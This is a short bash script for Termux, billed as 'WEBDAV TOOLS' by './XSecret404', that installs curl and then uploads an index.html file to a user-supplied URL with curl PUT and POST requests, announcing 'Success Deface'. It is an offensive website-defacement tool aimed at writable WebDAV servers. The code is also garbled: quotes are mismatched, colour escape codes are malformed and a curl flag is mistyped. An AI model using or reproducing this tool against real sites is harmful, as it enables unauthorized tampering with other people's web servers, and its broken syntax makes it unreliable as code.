#!/bin/bash

### color ###
{
white='\e[1;37m'
red='\e[1;31 m'
blue='\e[0;34 m'
lightgreen='\e[1;32 m'
}

if [ -f /data/data/com.termux/files/usr/bin/curl ];
then
    sleep 1
	echo -e $blue'[Ok] : [curl]: $lightgreen Found !"
else
    echo -e $blue"[x] : [curl]: $red Not Found !"
	echo ""
	echo -e $white"installing curl..."
	sleep 1
	apt-get install --force-yes -y curl
fi

echo ""
sleep 1
echo "installation Finished"
echo ""
sleep 1
clear

echo -e $blue"+++++++++++++++++++++++++++++++"
echo -e $red"WEBDAV TOOLS"
echo -e $blue"+++++++++++++++++++++++++++++++"
echo -e $red" Tools By ./XSecret404'
echo -e $red"www.xsecret404.6te.net"
echo -e $white''
if [ -z "$1" ]; then
        echo -e $red" ["$lightgreen"+"$red"]"$white"Using Deface curl."
		echo -e $red" ["$lightgreen"+"$red"]"$white"Use :$red$0 $white<URL>"
		exit 0
fi

echo
curl -k -T index.html $1
curl -k -X POST _F index.html $1
echo -e $blue"Success Deface
$red"$red"/index.html"